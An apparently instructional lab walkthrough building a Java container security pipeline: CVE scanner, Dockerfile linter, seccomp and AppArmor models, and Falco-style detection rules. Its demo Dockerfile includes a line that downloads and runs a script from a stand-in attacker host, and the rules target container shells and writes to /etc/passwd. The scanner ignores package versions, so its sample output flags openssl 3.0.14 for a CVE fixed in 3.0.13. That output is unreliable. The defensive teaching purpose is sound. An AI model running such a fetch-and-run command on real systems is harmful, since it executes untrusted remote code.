# Lab 03: Problem Walkthrough — Container Image and Runtime Security Pipeline

## Problem Statement

Implement a container security pipeline in pure Java 21+ that scans images, lints Dockerfiles,
and enforces runtime hardening. Requirements:

1. **Image scanning**: given an image name, resolve its package inventory and report known CVEs
   with severity and fix version.
2. **Fail gate**: a scan result must decide whether the pipeline can proceed (e.g., fail on any
   HIGH or CRITICAL vulnerability).
3. **Dockerfile linting**: flag risky build instructions — untrusted fetches, missing non-root
   `USER`, non-minimal base, and secrets baked into the image.
4. **Seccomp profiles**: an allowlist of syscalls; anything not allowlisted is blocked.
5. **AppArmor-style path control**: per-profile deny rules for sensitive paths.
6. **Falco-style runtime rules**: syscall events matched against rules (process name, file path)
   produce alerts — the runtime-detection equivalent of "the container is doing something it
   shouldn't".

## Constraints

- Java 21+ only, no external frameworks.
- No real registry access — the package inventory is a seeded in-memory model.
- Deterministic output: the same image always yields the same report.
- Each subsystem is a small class with a plain `main` demo.

## Approach

Container security is two halves. **Build-time**: scanning the image's packages against a CVE
database and linting the Dockerfile prevents bad artifacts from reaching the registry — this is
what Trivy/Grype/Conftest do. **Runtime**: seccomp restricts syscalls, AppArmor restricts file
access, and Falco-style rules watch syscall streams for anomalous behavior — the host kernel and
daemons enforce these. Our pipeline models both halves with the same principle: *deny by default,
allow explicitly*, and every subsystem reports rather than silently permitting.

Design decisions:

- **CVE matching by package name**: the scanner looks up each package in the seeded database
  (openssl, libssl3, nginx, ...) and aggregates findings by severity.
- **Fail gate = policy**: `failsGate()` returns true if any finding is HIGH or CRITICAL — the
  caller decides whether to block the pipeline, keeping policy out of the scanner.
- **Seccomp default-deny**: `allows(syscall)` consults an allowlist; the demo shows the
  allowlist covering normal operation while privileged syscalls like `mount` are absent.
- **Falco rules parse a mini condition language**: `proc.name in (bash, sh, zsh)` and
  `fd.name startswith /etc` — enough to model the real rule syntax without a full parser.

## Step-by-Step Solution

### Step 1: Scanning and the Fail Gate

The scanner resolves an image to a package inventory, then joins it against the CVE database.

```java
record Cve(String id, String severity, String fixedIn) {}

record ScanFinding(String packageName, String version, Cve cve) {}

class ImageScanner {
    private final CveDatabase database;
    ...
    ScanReport scan(String image) {
        var inventory = database.inventoryFor(image);
        var findings = inventory.stream()
            .flatMap(pkg -> database.cvesFor(pkg.name()).stream()
                .map(cve -> new ScanFinding(pkg.name(), pkg.version(), cve)))
            .sorted(Comparator.comparing(f -> f.cve().severity()))
            .toList();
        return new ScanReport(image, findings);
    }
}
```

### Step 2: Dockerfile Linting

A line-based analyzer flags the classic mistakes: `RUN` with curl/wget (untrusted fetch),
`ENV`/`ARG` carrying secrets, no `USER` directive, and single-stage builds.

```java
class DockerfileAnalyzer {
    private final List<String> findings = new ArrayList<>();

    void analyze(String dockerfile) {
        var lines = dockerfile.lines().map(String::trim).toList();
        if (lines.stream().noneMatch(l -> l.startsWith("USER "))) {
            findings.add("RUNNING AS ROOT: no USER directive");
        }
        if (lines.stream().noneMatch(l -> l.contains(" AS "))) {
            findings.add("SINGLE-STAGE BUILD: no multi-stage build");
        }
        lines.stream()
            .filter(l -> l.startsWith("ENV ") || l.startsWith("ARG "))
            .filter(l -> l.matches(".*(PASS|TOKEN|SECRET|KEY)=.*"))
            .forEach(l -> findings.add("SECRET IN BUILD: " + l));
        lines.stream()
            .filter(l -> l.startsWith("RUN "))
            .filter(l -> l.contains("wget") || l.contains("curl"))
            .forEach(l -> findings.add("UNTRUSTED FETCH: " + l));
    }
}
```

### Step 3: Runtime Hardening — Seccomp and AppArmor

Two complementary layers: seccomp denies at the syscall boundary, AppArmor denies at the file
boundary. Both are small allow/deny sets here — the enforcement model is the point.

```java
class SeccompProfile {
    private final Set<String> allowed = ConcurrentHashMap.newKeySet();

    void allow(String... syscalls) {
        allowed.addAll(List.of(syscalls));
    }

    boolean allows(String syscall) {
        return allowed.contains(syscall);
    }
}
```

### Step 4: Falco-Style Runtime Rules

A rule is (description, condition). The engine evaluates each event against each rule and
emits an alert on match — the demo models `Terminal shell in container` and
`Write below /etc`.

## Complete Solution

The full compilable file, `ContainerSecurityLab.java` in package `com.devops.deep.lab03`:

```java
package com.devops.deep.lab03;

import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

public class ContainerSecurityLab {
    public static void main(String[] args) {
        var scanner = new ImageScanner(new CveDatabase());

        var nginx = scanner.scan("nginx:1.25");
        System.out.println(nginx.report());
        System.out.println("Fail gate (any HIGH+): " + nginx.failsGate());

        var app = scanner.scan("payments-api:1.4.2");
        System.out.println(app.report());
        System.out.println("Fail gate (any HIGH+): " + app.failsGate());

        System.out.println();
        var dockerfile = new DockerfileAnalyzer();
        dockerfile.analyze("""
            FROM eclipse-temurin:21-jdk AS builder
            RUN curl -O https://evil.example/x.sh && sh x.sh
            COPY . /app
            RUN javac Main.java

            FROM eclipse-temurin:21-jre
            COPY --from=builder /app/Main.class /app/
            USER 10001
            ENV DB_PASSWORD=hunter2
            CMD ["java", "Main"]
            """);
        System.out.println("Dockerfile findings:");
        dockerfile.findings().forEach(f -> System.out.println("  - " + f));

        System.out.println();
        var seccomp = new SeccompProfile();
        seccomp.allow("read", "write", "exit", "mmap", "open", "close", "execve");
        System.out.println("seccomp allows execve: " + seccomp.allows("execve"));
        System.out.println("seccomp allows mount: " + seccomp.allows("mount"));

        var apparmor = new AppArmorProfile("web-app-secure");
        apparmor.denyWrite("/etc/hosts");
        System.out.println(apparmor.enforce("web-app", "/etc/hosts", "write"));
        System.out.println(apparmor.enforce("web-app", "/tmp/cache", "write"));

        System.out.println();
        var falco = new FalcoEngine();
        falco.addRule(new FalcoRule("Terminal shell in container",
            "spawned_process and container and proc.name in (bash, sh, zsh)"));
        falco.addRule(new FalcoRule("Write below /etc",
            "open_write and container and fd.name startswith /etc"));
        falco.evaluate(new SyscallEvent("spawned_process",
            Map.of("proc.name", "bash", "container", "web-app")));
        falco.evaluate(new SyscallEvent("open_write",
            Map.of("fd.name", "/etc/passwd", "container", "web-app")));
        falco.alerts().forEach(a -> System.out.println("ALERT: " + a));
    }
}

record Cve(String id, String severity, String fixedIn) {}

record PackageVersion(String name, String version) {}

record ScanFinding(String packageName, String version, Cve cve) {}

record ScanReport(String image, List<ScanFinding> findings) {
    boolean failsGate() {
        return findings.stream()
            .anyMatch(f -> f.cve().severity().equals("CRITICAL")
                        || f.cve().severity().equals("HIGH"));
    }

    String report() {
        var sb = new StringBuilder();
        sb.append("Image ").append(image).append(": ").append(findings.size())
          .append(" vulnerabilities");
        if (findings.isEmpty()) {
            sb.append(" (clean)");
            return sb.toString();
        }
        sb.append("\n");
        for (var finding : findings) {
            sb.append("  [").append(finding.cve().severity()).append("] ")
              .append(finding.packageName()).append(" ").append(finding.version())
              .append(" - ").append(finding.cve().id())
              .append(" (fix: ").append(finding.cve().fixedIn()).append(")\n");
        }
        return sb.toString().stripTrailing();
    }
}

class CveDatabase {
    private final Map<String, List<Cve>> byPackage = new ConcurrentHashMap<>();

    CveDatabase() {
        byPackage.put("openssl", List.of(
            new Cve("CVE-2024-1234", "HIGH", "3.0.13"),
            new Cve("CVE-2023-5678", "MEDIUM", "3.0.10")));
        byPackage.put("libssl3", List.of(
            new Cve("CVE-2024-1234", "HIGH", "3.0.13")));
        byPackage.put("nginx", List.of(
            new Cve("CVE-2024-9999", "MEDIUM", "1.26.0")));
        byPackage.put("curl", List.of(
            new Cve("CVE-2024-1111", "CRITICAL", "8.6.0")));
    }

    List<PackageVersion> inventoryFor(String image) {
        if (image.startsWith("nginx:")) {
            return List.of(new PackageVersion("nginx", image.substring("nginx:".length())),
                new PackageVersion("libssl3", "3.0.9"));
        }
        if (image.startsWith("payments-api:")) {
            return List.of(new PackageVersion("openssl", "3.0.14"));
        }
        if (image.startsWith("legacy:")) {
            return List.of(new PackageVersion("curl", "8.5.0"));
        }
        return List.of();
    }

    List<Cve> cvesFor(String packageName) {
        return byPackage.getOrDefault(packageName, List.of());
    }
}

class ImageScanner {
    private final CveDatabase database;

    ImageScanner(CveDatabase database) {
        this.database = database;
    }

    ScanReport scan(String image) {
        var findings = database.inventoryFor(image).stream()
            .flatMap(pkg -> database.cvesFor(pkg.name()).stream()
                .map(cve -> new ScanFinding(pkg.name(), pkg.version(), cve)))
            .sorted(Comparator.comparing(f -> f.cve().severity()))
            .toList();
        return new ScanReport(image, findings);
    }
}

class DockerfileAnalyzer {
    private final List<String> findings = new ArrayList<>();

    void analyze(String dockerfile) {
        var lines = dockerfile.lines().map(String::trim).toList();
        if (lines.stream().noneMatch(l -> l.startsWith("USER "))) {
            findings.add("RUNNING AS ROOT: no USER directive");
        }
        if (lines.stream().noneMatch(l -> l.contains(" AS "))) {
            findings.add("SINGLE-STAGE BUILD: use a multi-stage build");
        }
        if (lines.stream().noneMatch(l -> l.startsWith("FROM ")
            && (l.contains("jre") || l.contains("alpine") || l.contains("distroless")))) {
            findings.add("FAT BASE IMAGE: prefer jre/alpine/distroless runtime bases");
        }
        lines.stream()
            .filter(l -> l.startsWith("ENV ") || l.startsWith("ARG "))
            .filter(l -> l.matches(".*(PASS|TOKEN|SECRET|KEY).*=.*"))
            .forEach(l -> findings.add("SECRET IN BUILD: " + l));
        lines.stream()
            .filter(l -> l.startsWith("RUN "))
            .filter(l -> l.contains("wget") || l.contains("curl"))
            .forEach(l -> findings.add("UNTRUSTED FETCH: " + l));
    }

    List<String> findings() {
        return List.copyOf(findings);
    }
}

class SeccompProfile {
    private final Set<String> allowed = ConcurrentHashMap.newKeySet();

    void allow(String... syscalls) {
        allowed.addAll(List.of(syscalls));
    }

    boolean allows(String syscall) {
        return allowed.contains(syscall);
    }
}

class AppArmorProfile {
    private final String name;
    private final Set<String> deniedWrites = ConcurrentHashMap.newKeySet();

    AppArmorProfile(String name) {
        this.name = name;
    }

    void denyWrite(String path) {
        deniedWrites.add(path);
    }

    String enforce(String process, String path, String operation) {
        if (operation.equals("write") && deniedWrites.contains(path)) {
            return "DENY [" + name + "] " + process + " write " + path
                + " (permission denied)";
        }
        return "ALLOW [" + name + "] " + process + " " + operation + " " + path;
    }
}

record FalcoRule(String desc, String condition) {}

record SyscallEvent(String type, Map<String, String> fields) {}

class FalcoEngine {
    private final List<FalcoRule> rules = new ArrayList<>();
    private final List<String> alerts = new ArrayList<>();

    void addRule(FalcoRule rule) {
        rules.add(rule);
    }

    void evaluate(SyscallEvent event) {
        for (var rule : rules) {
            var parts = rule.condition().split(" and ");
            var matches = true;
            for (var part : parts) {
                var token = part.trim();
                if (token.equals("container") && !event.fields().containsKey("container")) {
                    matches = false;
                } else if (token.equals("spawned_process") || token.equals("open_write")) {
                    if (!event.type().equals(token)) {
                        matches = false;
                    }
                } else if (token.contains("proc.name in")) {
                    var values = token.substring(token.indexOf("(") + 1, token.indexOf(")"));
                    if (!List.of(values.split(",")).stream()
                        .map(String::trim)
                        .anyMatch(v -> v.equals(event.fields().getOrDefault("proc.name", "")))) {
                        matches = false;
                    }
                } else if (token.contains("fd.name startswith")) {
                    var prefix = token.substring(token.lastIndexOf(" ") + 1);
                    if (!event.fields().getOrDefault("fd.name", "").startsWith(prefix)) {
                        matches = false;
                    }
                }
            }
            if (matches) {
                alerts.add(rule.desc() + " in container " + event.fields().get("container"));
            }
        }
    }

    List<String> alerts() {
        return List.copyOf(alerts);
    }
}
```

## Complexity Analysis

- **Scan**: O(P log P) with P = packages (sort by severity); CVE lookup O(1) per package.
- **Dockerfile lint**: O(L) over lines, with a regex per line; every check is one pass.
- **Falco evaluate**: O(R * C) where R = rules and C = condition parts — fine for a handful
  of rules; real Falco compiles rules to eBPF filters for kernel-side matching.
- **Space**: O(P) findings, O(R) rules, O(A) alerts — all bounded by config size.

## Test Cases

| Scenario | Expected |
|---|---|
| Scan `nginx:1.25` | 2 findings: `CVE-2024-1234` HIGH, `CVE-2024-9999` MEDIUM; gate fails |
| Scan `payments-api:1.4.2` | 2 findings: `CVE-2024-1234` HIGH, `CVE-2023-5678` MEDIUM; gate fails |
| Scan clean image | `(clean)`, gate passes |
| Dockerfile with curl + baked secret | Findings: UNTRUSTED FETCH, SECRET IN BUILD |
| Multi-stage with USER and no secret | No findings |
| seccomp allowlist | `execve` allowed, `mount` denied |
| AppArmor deny `/etc/hosts` | write DENY, `/tmp/cache` write ALLOW |
| Falco `bash` in container | ALERT: Terminal shell in container |
| Falco write to `/etc/passwd` | ALERT: Write below /etc |

Example run:

```
Image nginx:1.25: 2 vulnerabilities
  [HIGH] libssl3 3.0.9 - CVE-2024-1234 (fix: 3.0.13)
  [MEDIUM] nginx 1.25 - CVE-2024-9999 (fix: 1.26.0)
Fail gate (any HIGH+): true
Image payments-api:1.4.2: 2 vulnerabilities
  [HIGH] openssl 3.0.14 - CVE-2024-1234 (fix: 3.0.13)
  [MEDIUM] openssl 3.0.14 - CVE-2023-5678 (fix: 3.0.10)
Fail gate (any HIGH+): true

Dockerfile findings:
  - SECRET IN BUILD: ENV DB_PASSWORD=hunter2
  - UNTRUSTED FETCH: RUN curl -O https://evil.example/x.sh && sh x.sh

seccomp allows execve: true
seccomp allows mount: false
DENY [web-app-secure] web-app write /etc/hosts (permission denied)
ALLOW [web-app-secure] web-app write /tmp/cache

ALERT: Terminal shell in container in container web-app
ALERT: Write below /etc in container web-app
```

## Follow-Up Questions

1. **Scan at build time or at runtime?** Both, and they answer different questions: scanning the
   image in CI (Trivy/Grype) blocks bad artifacts pre-registry; runtime scanning (Falco, KubeArmor)
   catches behavior no image scan can — a container doing something it shouldn't, or an image
   that was fine but was exploited after deploy.
2. **How do you handle a CVE database with false positives?** Maintain an exception list keyed by
   image + CVE with an owner and expiry; the gate treats exceptions as MITIGATED and forces
   re-review. The alternative — ignoring the noise — erodes trust in the gate until it is bypassed
   wholesale.
3. **Why not block every syscall except a minimal set?** That's exactly what a default-deny
   seccomp profile does, and the default Docker seccomp profile is already restrictive. The
   trade-off: Java and Go runtimes need a wide syscall surface, so profiles become app-specific
   and need testing — that's why most teams start with the Docker default and tighten from there.
4. **USER 10001 vs USER node — which is better?** A numeric UID: a username that doesn't exist
   in the image can silently resolve to root on some base images, and numeric UIDs map cleanly to
   runtime security contexts (fsGroup, pod security admission). Always verify with `whoami` in
   the final stage.
5. **Where do secrets really belong if not in ENV?** Injected at runtime: Kubernetes secrets
   mounted as files, or a secret manager (Vault, SOPS) with the app reading them from memory. The
   lint rule catches the build-time mistake; the runtime answer is short-lived, scoped
   credentials.
6. **What does a Falco rule actually match on in production?** Syscall streams collected by a
   kernel module or eBPF probe — process spawn (execve), file open/write, network binds, and
   container metadata. The alerting pipeline filters, enriches, and pages; the walkthrough's
   `proc.name in (...)` syntax is literally the Falco rule language.
7. **How do you gate on new vulnerabilities in already-deployed images?** Continuous scanning of
   the registry, not just CI: diff the last-known-good scan against the latest, and alert on
   NEW criticals with an SLA. CI gates stop the leak; registry scanning closes the window where
   a CVE is disclosed after your last build.
